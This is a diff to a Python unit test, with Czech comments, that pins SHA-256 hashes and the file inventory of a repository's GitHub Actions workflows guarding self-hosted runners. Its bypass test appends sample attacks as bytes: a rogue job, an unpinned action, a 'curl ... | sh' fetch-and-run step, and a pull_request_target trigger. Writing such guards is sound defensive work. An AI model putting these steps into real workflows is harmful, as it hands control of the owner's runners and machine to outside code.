@@ -7,12 +7,50 @@ Nespouští CI, nedotýká se GitHub tokenů ani domácího počítače.
 from pathlib import Path
 import re
 import unittest
+import hashlib
 
 ROOT = Path(__file__).resolve().parents[1]
 QA = ROOT / ".github/workflows/windows-self-hosted-qa.yml"
 RELEASE = ROOT / ".github/workflows/windows-home-apk-release.yml"
 QA_JOB_GATE = "${{ github.repository == 'zaplikj30-ui/Zamerovac-android' && github.actor == 'zaplikj30-ui' && github.ref == 'refs/heads/main' && (github.event_name == 'push' || github.event_name == 'workflow_dispatch') }}"
 RELEASE_JOB_GATE = "${{ github.repository == 'zaplikj30-ui/Zamerovac-android' && github.actor == 'zaplikj30-ui' && github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' && inputs.publish_release == true && inputs.qa_run_id != '' }}"
+
+
+# Přesné otisky známých, samostatně zkontrolovaných workflow. Každá změna
+# včetně run: příkazů vyžaduje nezávislou revizi a vědomou aktualizaci otisku.
+# Není to ochrana před úmyslným commitem, který změní současně test i workflow.
+WORKFLOW_NAMES = frozenset((
+    "build-apk.yml",
+    "emulator-smoke.yml",
+    "export-audit-sources.yml",
+    "quick-check.yml",
+    "verify-native.yml",
+    "windows-home-apk-release.yml",
+    "windows-self-hosted-qa.yml",
+))
+WORKFLOW_SHA256 = {
+    "windows-self-hosted-qa.yml": "5619a1a787236a22eaed4f90671bc88b10791ab0af7e27996747d4a7443d26c4",
+    "windows-home-apk-release.yml": "672c76ae8f0ac3a8ce38cf98adf8661ec5631cca5b483e5c356a7dfad1f76911",
+}
+
+
+def workflow_inventory_violations(names):
+    """Kdyby přibyl i x.yaml s libovolným eventem, musí test selhat."""
+    return [] if set(names) == WORKFLOW_NAMES else [
+        "Nečekaný nebo chybějící workflow soubor: "
+        + repr(sorted(set(names) ^ WORKFLOW_NAMES))
+    ]
+
+
+def workflow_snapshot_violations(name, raw_bytes):
+    """Tělo důvěryhodného workflow včetně všech jobů/steps/run musí souhlasit."""
+    expected = WORKFLOW_SHA256.get(name)
+    if expected is None:
+        return ["Neznámý důvěryhodný workflow soubor"]
+    actual = hashlib.sha256(raw_bytes).hexdigest()
+    return [] if actual == expected else [
+        f"Obsah {name} se změnil; vyžaduje nezávislou revizi a nový otisk"
+    ]
 
 
 def section(text, name):
@@ -107,6 +145,36 @@ def release_violations(text):
 
 
 class HomeRunnerTrustContract(unittest.TestCase):
+    def test_actual_workflow_inventory_and_pinned_sources(self):
+        workflow_dir = ROOT / ".github/workflows"
+        names = {p.name for p in workflow_dir.iterdir()
+                 if p.is_file() and p.suffix in {".yml", ".yaml"}}
+        self.assertEqual([], workflow_inventory_violations(names))
+        for name in WORKFLOW_SHA256:
+            with self.subTest(workflow=name):
+                self.assertEqual(
+                    [],
+                    workflow_snapshot_violations(
+                        name, (workflow_dir / name).read_bytes(),
+                    ),
+                )
+
+    def test_snapshot_guard_rejects_claude_bypass_examples(self):
+        for name in WORKFLOW_SHA256:
+            original = (ROOT / ".github/workflows" / name).read_bytes()
+            samples = (
+                original + b"\\n  Evil_job:\\n    runs-on: [self-hosted, zamerovac-qa]\\n    steps:\\n      - run: echo PWNED\\n",
+                original + b"\\n      - uses: anything@main\\n",
+                original + b"\\n      - run: curl example.invalid/script | sh\\n",
+                original + b"\\npull_request_target: {}\\n",
+            )
+            for mutated in samples:
+                with self.subTest(workflow=name, mutation=mutated[-90:]):
+                    self.assertNotEqual(original, mutated)
+                    self.assertTrue(workflow_snapshot_violations(name, mutated))
+        self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"x.yaml"}))
+        self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"unsafe.yml"}))
+
     def test_actual_home_qa_is_restricted(self):
         self.assertEqual([], qa_violations(QA.read_text(encoding="utf-8")))
 
